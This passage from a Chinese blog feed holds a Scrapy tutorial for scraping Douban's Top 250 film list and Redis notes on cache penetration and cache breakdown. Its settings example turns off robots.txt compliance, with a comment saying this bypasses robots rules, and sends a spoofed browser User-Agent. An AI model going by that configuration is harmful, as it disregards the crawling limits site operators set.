class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;douban&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;movie.douban.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://movie.douban.com/top250&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="comment"># 电影名字</span></span><br><span class="line">        name = response.xpath(<span class="string">&#x27;.//div[@id=&quot;content&quot;]/div/div/ol/li[*]/div/div/div/a/span[1]/text()&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 电影评分</span></span><br><span class="line">        score = response.xpath(<span class="string">&#x27;.//*[@id=&quot;content&quot;]/div/div[1]s/ol/li[*]/div/div/div/div/span[3]/@content&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 美化格式</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">            <span class="comment">#在爬虫中导入并且实例化对象, 使用方法跟使用字典类似</span></span><br><span class="line">            item = MyspiderItem()</span><br><span class="line">            item[<span class="string">&#x27;name&#x27;</span>] = name[i]<span class="comment"># 这里的键名要跟item.py中字段名一致</span></span><br><span class="line">            item[<span class="string">&#x27;score&#x27;</span>] = score[i]</span><br><span class="line">            <span class="built_in">print</span>(item)</span><br><span class="line">            <span class="keyword">yield</span> item      <span class="comment"># yield 会把数据传给管道</span></span><br></pre></td></tr></table></figure><div class="note warning no-icon flat"><p>注意：</p><ul><li>scrapy.Spider爬虫类中必须有名为parse的解析</li><li>如果网站结构层次比较复杂，也可以自定义其他解析函数</li><li>在解析函数中提取的url地址如果要发送请求，则必须属于allowed_domains范围内，但是start_urls中的url地 址不受这个限制，我们会在后续的课程中学习如何在解析函数中构造发送请求</li><li>启动爬虫的时候注意启动的位置，是在项目路径下启动</li><li>parse()函数中使用yield返回数据，注意：解析函数中的yield能够传递的对象只能是：BaseItem, Request, dict, None</li></ul></div><p><strong>三、定位元素以及提取数据、属性值的方法</strong></p><div class="note info flat"><p>解析并获取scrapy爬虫中的数据: 利用xpath规则字符串进行定位和提取</p></div><ol><li><p>response.xpath方法的返回结果是一个类似list的类型，其中包含的是selector对象，操作和列表一样，但是有 一些额外的方法</p></li><li><p>额外方法extract()：返回一个包含有字符串的列表（相当于getall() ）</p></li><li><p>额外方法extract_first()：返回列表中的第一个字符串，列表为空没有返回None（相当于get() ）</p></li></ol><p><strong>四、response响应对象的常用属性</strong></p><ul><li>response.url：当前响应的url地址</li><li>response.request.url：当前响应对应的请求的url地址</li><li>response.headers：响应头</li><li>response.requests.headers：当前响应的请求头</li><li>response.body：响应体，也就是html代码，byte类型</li><li>response.status：响应状态码</li></ul><p><strong>五、（改进版）可构造Request对象，并发送请求</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> ..items <span class="keyword">import</span> MyspiderItem</span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span>     <span class="comment"># 全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;douban&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;movie.douban.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://movie.douban.com/top250&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="comment"># 电影名字</span></span><br><span class="line">        name = response.xpath(<span class="string">&#x27;.//div[@id=&quot;content&quot;]/div/div/ol/li[*]/div/div/div/a/span[1]/text()&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 电影评分</span></span><br><span class="line">        score = response.xpath(<span class="string">&#x27;.//*[@id=&quot;content&quot;]/div/div[1]/ol/li[*]/div/div/div/div/span[2]/text()&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 电影链接</span></span><br><span class="line">        link = response.xpath(<span class="string">&#x27;.//*[@id=&quot;content&quot;]/div/div[1]/ol/li[*]/div/div[2]/div[1]/a/@href&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 美化格式</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">            item = MyspiderItem()</span><br><span class="line">            <span class="keyword">global</span> num</span><br><span class="line">            <span class="keyword">if</span> num == i:        <span class="comment"># 防止乱序</span></span><br><span class="line">                item[<span class="string">&#x27;num&#x27;</span>] = num+<span class="number">1</span></span><br><span class="line">                item[<span class="string">&#x27;name&#x27;</span>] = name[i]</span><br><span class="line">                item[<span class="string">&#x27;score&#x27;</span>] = score[i]</span><br><span class="line">                <span class="comment"># print(item)</span></span><br><span class="line">                <span class="comment"># yield item      # yield 会把数据传给管道</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># print(link[i])</span></span><br><span class="line">                <span class="comment"># 对获取的电影链接去发送请求</span></span><br><span class="line">                <span class="keyword">yield</span> scrapy.Request(link[i], callback=self.parse_data, meta=&#123;<span class="string">&#x27;item2&#x27;</span>: item&#125;)</span><br><span class="line">                num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 翻页操作一</span></span><br><span class="line">        next_url = response.xpath(<span class="string">&#x27;.//*[@id=&quot;content&quot;]/div/div[1]/div[2]/span[3]/a/@href&#x27;</span>).get()</span><br><span class="line">        <span class="comment"># 拼接</span></span><br><span class="line">        next_url = <span class="string">&#x27;https://movie.douban.com/top250&#x27;</span> + next_url</span><br><span class="line"></span><br><span class="line">        <span class="comment"># # 翻页操作二</span></span><br><span class="line">        <span class="comment"># # n_url = response.xpath(&quot;//a[text()=&#x27;后页&gt;&#x27;]/@href&quot;)</span></span><br><span class="line">        <span class="comment"># # 直接使用response携带残缺的url</span></span><br><span class="line">        <span class="comment"># # yield response.follow(n_url, callback=self.parse)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 手动构造请求对象，指定解析起始url的parse方法</span></span><br><span class="line">        <span class="comment"># yield scrapy.Request(next_url, callback=self.parse)   # 数据过多，防止被反爬，先注释掉  </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析详情的函数(自定义)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_data</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        item = response.meta.get(<span class="string">&#x27;item2&#x27;</span>)   <span class="comment"># 或 item = response.meta[&#x27;item2&#x27;]</span></span><br><span class="line">        <span class="comment"># print(item)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取详情简介</span></span><br><span class="line">        <span class="comment"># 有的节点不一样，有些是div/span   有些div/span/span</span></span><br><span class="line">        <span class="comment"># // *[ @ id = &quot;link-report&quot;] / span[1] / text()</span></span><br><span class="line">        <span class="comment"># // *[ @ id = &quot;link-report&quot;] / span[1] / span / text()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># content = response.xpath(&#x27;//*[@id=&quot;link-report&quot;]/span[1]/span/text()&#x27;).get()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># string(path) 方法会提取父标签下的文本内容</span></span><br><span class="line">        <span class="comment"># path  就是父标签的路径</span></span><br><span class="line">        content = response.xpath(<span class="string">&#x27;string(.//*[@id=&quot;link-report&quot;]/span)&#x27;</span>).get()</span><br><span class="line">        <span class="comment"># print(&#x27;详情:&#x27;, content)</span></span><br><span class="line">        item[<span class="string">&#x27;con&#x27;</span>] = content.strip()  <span class="comment"># strip()去除左右两边的空格</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><p>scrapy.Request()中的常见参数解释</p><table><thead><tr><th>参数</th><th>解释</th><th>是否必填</th></tr></thead><tbody><tr><td>url</td><td>请求的url</td><td>是</td></tr><tr><td>callback</td><td>回调函数，用于接收请求后的返回信息，若没指定，则默认为parse()函数</td><td>是</td></tr><tr><td>meta</td><td>方法之间以字典形式传递参数，这个参数一般也可在<code>middlewares</code>中处理</td><td>否</td></tr><tr><td>method</td><td>http请求的方式，默认为GET请求，一般不需要指定。若需要POST请求，建议使用用<code>scrapy.FormRequest()</code></td><td>否</td></tr><tr><td>headers</td><td>dict类型，请求头信息，一般在settings中设置即可，也可在middlewares中设置</td><td>否</td></tr><tr><td>cookies</td><td>dict或list类型，请求的cookie</td><td>否</td></tr><tr><td>dont_filter</td><td>是否开启过滤，默认关闭，开启之后爬取过的url,下一次不会再爬取</td><td>否</td></tr><tr><td>errback</td><td>抛出错误的回调函数并打印出来，错误包括404，超时，DNS错误等</td><td>否</td></tr></tbody></table><div class="note success no-icon flat"><p>发送post请求</p><p><code>scrapy.FormRequest(url，callback, formdata)</code></p><p>FormRequest 类为Request的子类，用于POST请求，其他参数与Request一样，其中新增的<code>formdata</code>是dict类型，相当于meta。</p></div><h2 id="保存数据">保存数据</h2><div class="note info flat"><p>利用管道pipeline来处理（保存）数据</p></div><p><strong>一、在pipelines.py文件中定义对数据的操作</strong></p><ol><li>定义一个管道类</li><li>重写管道类的process_item方法</li><li>process_item方法处理完item之后必须返回给引擎</li><li>定义数据的保存逻辑</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyspiderPipeline</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        self.file = <span class="built_in">open</span>(<span class="string">&#x27;douban.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        <span class="comment"># with open(&#x27;douban250.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as f:</span></span><br><span class="line">        <span class="comment">#     f.write(str(item) + &#x27;\n&#x27;)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 把传递数据的载体item对象转为一个字典</span></span><br><span class="line">        dic = <span class="built_in">dict</span>(item)</span><br><span class="line">        js_data = json.dumps(dic, ensure_ascii=<span class="literal">False</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        self.file.write(js_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        self.file.close()</span><br></pre></td></tr></table></figure><ul><li>def open_spider(self, spider) —— 爬虫<code>开启</code>时执行一次，可用来<code>打开</code>文件</li><li>def process_item(self, item, spider) ——实现数据的写入操作</li><li>def close_spider(self, spider) —— 爬虫<code>关闭</code>时执行一次，可用来<code>关闭</code>文件</li></ul><p><strong>二、<a href="http://xn--settings-q86n.py">在settings.py</a> 配置启用管道</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启用管道配置</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">&#x27;myspider.pipelines.MyspiderPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过robots规则，直接爬取页面</span></span><br><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加User-agent</span></span><br><span class="line"><span class="comment">#USER_AGENT = &#x27;myspider (+http://www.yourdomain.com)&#x27;</span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加cookie</span></span><br><span class="line">COOKIES_ENABLED = <span class="literal">False</span></span><br><span class="line">DEFAULT_REQUEST_HEADERS = &#123;</span><br><span class="line">  <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>setting.py一般都会将<code>管道配置</code>注释掉，取消注释即可。</p><p>配置项中键为使用的管道类，管道类使用<code>.</code>进行分割，第一个为<code>项目目录</code>，第二个为<code>文件</code>，第三个为<code>定义的管道类</code>。 配置项中值为管道的使用顺序，设置的数值<code>越小越优先执行</code>，该值一般设置为1000以内。</p><h2 id="运行爬虫">运行爬虫</h2><p>命令：在<strong>项目目录下</strong>执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl &lt;爬虫名字&gt;(--nolog)</span><br></pre></td></tr></table></figure><div class="note orange icon flat"><i class="note-icon fas fa-battery-half"></i><p>—nolog：不显示调试信息，不加即默认显示</p></div><p>示例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl douban --nolog</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/运行结果.5s2ykwcn5bk0.jpg" alt="运行结果" style="zoom:67%;" /><h2 id="crawlspider爬虫">crawlspider爬虫</h2><p>回顾之前的代码，有很多一部分时间都寻找下一页的url地址或者内容的url地址上面，而这个过程能更简单吗？</p><p>需求思路：</p><ol><li>从response中提取所有的满足规则的url地址</li><li>自动的构造自己requests请求，发送给引擎</li></ol><p>而<code>crawlspider</code>就可以满足上述需求，能够匹配满足条件的url地址，组装成Reuqest对象后自动发送给引擎， 同时能够指定callback函数，</p><p>即：<u>crawlspider爬虫可以按照规则自动获取连接</u></p><div class="note info no-icon flat"><p>Scrapy框架中分两类爬虫，Spider类和CrawlSpider类。CrawlSpider继承自spider，只不过是在之前的基础上增加了新的功能。可以定义爬取的url的规则，以后scrapy碰到满足条件的url都进行爬取，而不用手动yield Request。</p></div><h2 id="创建crawlspider爬虫并观察爬虫内的默认内容">创建crawlspider爬虫并观察爬虫内的默认内容</h2><p><strong>一、创建crawlspider爬虫：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy genspider -t crawl douban movie.douban.com</span><br></pre></td></tr></table></figure><p><strong>二、spider中默认生成的内容如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor</span><br><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> CrawlSpider, Rule</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubnSpider</span>(<span class="params">CrawlSpider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;douban&#x27;</span></span><br><span class="line">    allowed_domains = [<span class="string">&#x27;movie.douban.com&#x27;</span>]</span><br><span class="line">    start_urls = [<span class="string">&#x27;http://movie.douban.com/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    rules = (</span><br><span class="line">        Rule(LinkExtractor(allow=<span class="string">r&#x27;Items/&#x27;</span>), callback=<span class="string">&#x27;parse_item&#x27;</span>, follow=<span class="literal">True</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse_item</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        item = &#123;&#125;</span><br><span class="line">        <span class="comment">#item[&#x27;domain_id&#x27;] = response.xpath(&#x27;//input[@id=&quot;sid&quot;]/@value&#x27;).get()</span></span><br><span class="line">        <span class="comment">#item[&#x27;name&#x27;] = response.xpath(&#x27;//div[@id=&quot;name&quot;]&#x27;).get()</span></span><br><span class="line">        <span class="comment">#item[&#x27;description&#x27;] = response.xpath(&#x27;//div[@id=&quot;description&quot;]&#x27;).get()</span></span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><p><strong>三、观察其与跟普通的scrapy.spider的区别</strong></p><div class="note danger flat"><p>在crawlspider爬虫中，没有parse函数</p></div><p>重点在<code>rules</code>中：</p><ol><li>rules是一个元组或者是列表，包含的是Rule对象</li><li>Rule表示规则，其中包含LinkExtractor，callback和follow等参数</li><li>LinkExtractor:连接提取器，可以通过<code>正则</code>或者是<code>xpath</code>来进行url地址的匹配</li><li>callback :表示经过连接提取器提取出来的url地址响应的回调函数，可以没有，没有表示响应不会进行回调函数 的处理</li><li>follow：连接提取器提取的url地址对应的响应是否还会继续被rules中的规则进行提取，True表示会，Flase表示不会</li></ol><p><strong>四、crawlspider使用的注意点</strong></p><ol><li>除了用命令 <code>scrapy genspider -t crawl &lt;爬虫名&gt;  &lt;allowed_domail&gt;</code>创建一个crawlspider的模板，页可以手动创建</li><li>crawlspider中<code>不能</code>再有以<code>parse</code>为名的数据提取方法，该方法被crawlspider用来实现基础url提取等功能</li><li>Rule对象中LinkExtractor为固定参数，其他callback、follow为可选参数</li><li>不指定callback且follow为True的情况下，满足rules中规则的url还会被继续提取和请求</li><li>如果一个被提取的url满足多个Rule，那么会从rules中选择一个满足匹配条件的Rule执行</li></ol><p><strong>五、crawlspider其他知识点的了解</strong></p><ol><li>链接提取器<code>LinkExtractor</code>的更多常见参数<ul><li>allow：满足括号中的’re’表达式的url会被提取，如果为空，则全部匹配</li><li>deny：满足括号中的’re’表达式的url不会被提取，优先级高于allow</li><li>allow_domains：会被提取的链接的domains(url范围)，如： [‘<a href="http://hr.tencent.com">hr.tencent.com</a>’, ‘<a href="http://baidu.com">baidu.com</a>’]</li><li>deny_domains：不会被提取的链接的domains(url范围)</li><li>restrict_xpaths：使用xpath规则进行匹配，和allow共同过滤url，即xpath满足的范围内的url地址会被 提取，如： restrict_xpaths=‘//div[@class=“pagenav”]’</li></ul></li><li><code>Rule</code>常见参数<ul><li>LinkExtractor：链接提取器，可以通过正则或者是xpath来进行url地址的匹配</li><li>callback：表示经过连接提取器提取出来的url地址响应的回调函数，可以没有，没有表示响应不会进行回调 函数的处理</li><li>follow：连接提取器提取的url地址对应的响应是否还会继续被rules中的规则进行提取，默认True表示会， Flase表示不会</li><li>process_links：当链接提取器LinkExtractor获取到链接列表的时候调用该参数指定的方法，这个自定义方 法可以用来过滤url，且这个方法执行后才会执行callback指定的方法</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis学习笔记（3）</title>
      <link href="/posts/6cb57fa2/"/>
      <url>/posts/6cb57fa2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>Redis应用问题</h1><h2 id="前言">前言</h2><p>用户的数据一般都是存储于数据库中，数据库的数据是落在磁盘上的，磁盘的读写速度可以说是计算机里硬件中最慢的了。</p><p>当用户的请求，都访问数据库的话，请求数量一上来，数据库很容易就崩溃，所以为了避免用户直接访问数据库，会用<code>Redis</code>作为<code>缓存层</code>。</p><p><code>Redis</code>是内存数据库，将数据库的数据缓存在<code>Redis</code>中，相当于数据缓存在内存中，内存的读写速度比硬盘快好几个数量级，这也大大提高了系统性能。</p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210814/缓存层与存储层.id06cl9w4q8.png" alt="缓存层与存储层" style="zoom: 67%;" /><p>引入了缓存层，随之而来的是有关缓存异常的一些问题：<code>缓存穿透</code>、<code>缓存击穿</code>、<code>缓存雪崩</code>、<code>缓存颠簸</code>、<code>缓存预热</code>、<code>缓存降级</code>…而前三个也正是有些企业面试经常考察的问题。</p><h2 id="缓存穿透">缓存穿透</h2><h3 id="概念">概念</h3><p><code>缓存层</code>和<code>数据库</code>中<code>都没有</code>的数据，而用户不断发起请求，导致请求在访问缓存时，发现缓存缺失，再去访问数据库，如果从数据库中查不到该数据则不写入缓存，这将导致这个不存在的数据每次请求都要到存储层去查询，失去了缓存保护后端持久的意义。</p><p>而我们数据库的 id 都是1开始自增上去的，如发起为id值为 -1 的数据或 id 为特别大不存在的数据。这时的用户很可能是攻击者，攻击会导致数据库压力过大，严重会击垮数据库。</p><h3 id="造成原因">造成原因</h3><ol><li>自身业务代码或者数据出现问题（例如：set 和 get 的key不一致，数据被误删除）</li><li>一些恶意攻击、爬虫等造成大量空命中（爬取线上商城商品数据，超大循环递增商品的ID）</li></ol><h3 id="解决方案">解决方案</h3><p><strong>一、非法请求的限制</strong></p><p>当有大量恶意请求访问不存在的数据时，也会发生缓存穿透，因此在API入口处我们要<code>判断请求参数是否合理，请求参数是否含有非法字符、请求字段是否存在</code>，如果判断出是恶意请求就直接返回错误，避免进一步访问缓存层和数据库。</p><p><strong>二、缓存空对象</strong></p><p>缓存空对象：是指在持久层没有命中的情况下，对key进行set （key,null）</p><p>缓存空对象会有<code>两个问题</code>：</p><p>第一，value为null不代表不占用内存空间，空值做了缓存，意味着缓存层中存了更多的键，需要更多的内存空间，<code>比较有效的方法</code>是针对这类数据设置一个较短的过期时间，让其自动剔除。</p><p>第二，缓存层和存储层的数据会有一段时间窗口的<code>不一致</code>，可能会对业务有一定影响。</p><p>例如过期时间设置为5分钟，如果此时存储层添加了这个数据，那这段时间内就会出现缓存层和存储层数据的不一致，此时可以利用<code>消息系统</code>或者其他方式清除掉缓存层中的空对象</p><p><strong>三、布隆过滤器(Bloom Filter)拦截</strong></p><p>布隆过滤器实际上是一个很长的<code>二进制向量</code>和一系列<code>随机映射函数</code>，其实也可以说是由<code>初始值都为0的位图数组</code>和<code>N个哈希函数</code>两部分组成的。布隆过滤器可以用于检索一个元素是否在一个集合中。</p><p>优点是空间效率和查询时间都远远超过一般的算法，缺点是有一定的误识别率和删除困难。</p><p>在写入数据库数据时，将存在的key使用布隆过滤器<code>标记一下</code>，然后在用户请求到来时，业务线程确认缓存失效后，可以<code>通过查询布隆过滤器快速判断数据是否存在</code>，如果不存在，就不用通过查询数据库来判断数据是否存在。</p><p>即使发生了缓存穿透，大量请求只会查询<code>Redis</code>和<code>布隆过滤器</code>，而不会查询数据库，这就拦截了很多注定没有结果的查询，降低了数据库的负载，保证了数据库正常运行。</p><p>布隆过滤器会通过<code>3个操作</code>完成标记：</p><ol><li>使用N个哈希函数分别对数据做哈希计算，得到N个哈希值；</li><li>将第一步得到的N个哈希值对位图数组的长度取模，得到每个哈希值在位图数组的对应位置；</li><li>将每个哈希值在位图数组的对应位置的值设置为1；</li></ol><p>举个栗子：假设有一个位图数组长度为 8，哈希函数 3 个的布隆过滤器。<br></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210814/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8%E4%BE%8B%E5%AD%90.4jkr5jfjjme0.png" alt="布隆过滤器例子"></p><p><br>在数据库写入数据 x 后，把数据 x 标记在布隆过滤器时，数据 x 会被 3 个哈希函数分别计算出 3 个哈希值，然后在对这 3 个哈希值对 8 取模，假设取模的结果为 1、4、6，然后把位图数组的第 1、4、6 位置的值设置为 1。<strong>当应用要查询数据 x 是否数据库时，通过布隆过滤器只要查到位图数组的第 1、4、6 位置的值是否全为 1，只要有一个为 0，就认为数据 x 不在数据库中</strong>。</p><p>布隆过滤器由于是基于<code>哈希函数</code>实现查找的，高效查找的同时<code>存在哈希冲突的可能性</code>，比如数据 x 和数据 y 可能都落在第 1、4、6 位置，而事实上，可能数据库中并不存在数据 y，存在误判的情况。</p><p>所以，<strong>查询布隆过滤器说数据存在，并不一定证明数据库中存在这个数据，但是查询到数据不存在，数据库中一定就不存在这个数据</strong>。虽有一定的误识别率，但没有识别错误的情形。</p><div class="note info flat"><p>布隆过滤器适用场景：爬虫系统url去重、垃圾邮件过滤、黑名单…</p></div><h2 id="缓存击穿">缓存击穿</h2><h3 id="概念-2">概念</h3><p>存在<code>某个</code>热点数据key，例如商城秒杀活动、热搜等等。</p><p>用户<code>大并发集中</code>对这一个<code>key</code>进行访问，<code>缓存层</code>在不停地扛着大并发，而当这个 key 在<code>失效过期</code>的瞬间，<code>持续</code>的<code>大并发</code>就会穿破缓存层，直接访问数据库，此时就像在一个完好无损的桶上凿开了一个洞。</p><p>当发生缓存击穿的时候，数据库的查询压力会倍增，导致大量的请求阻塞。</p><h3 id="解决方案-2">解决方案</h3><p><strong>一、预先设置热点数据</strong></p><p>在Redis高峰访问之前，把一些热点数据提前存入redis中，增加热点数据key的过期时间</p><p><strong>二、实时调整</strong></p><p>现场监控哪些数据被频繁访问，实时调整key的过期时间</p><p><strong>三、永不过期</strong></p><p>不给热点数据设置过期时间，若数据需要更新的话，可以在后台开启一个异步线程，发现过期的 key 直接重写缓存即可</p><p><strong>四、分布式互斥锁</strong></p><p>当业务线程在处理用户请求时，<strong>如果发现访问的数据不在 Redis 里，就加个互斥锁，保证同一时间内只有一个请求来构建缓存</strong>（<u>从数据库读取数据，再将数据更新到 Redis 里</u>），当缓存构建完成后，再释放锁。未能获取互斥锁的请求，要么等待锁释放后重新读取缓存，要么就返回空值或者默认值。</p><p>实现互斥锁的时候，最好<code>设置超时时间</code>，不然第一个请求拿到了锁，然后这个请求发生了某种意外而一直阻塞，一直不释放锁，这时其他请求也一直拿不到锁，整个系统就会出现<code>无响应</code>现象。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setex &lt;key&gt; &lt;second&gt; &lt;value&gt;//上锁并设置过期时间</span><br><span class="line">set &lt;key&gt; 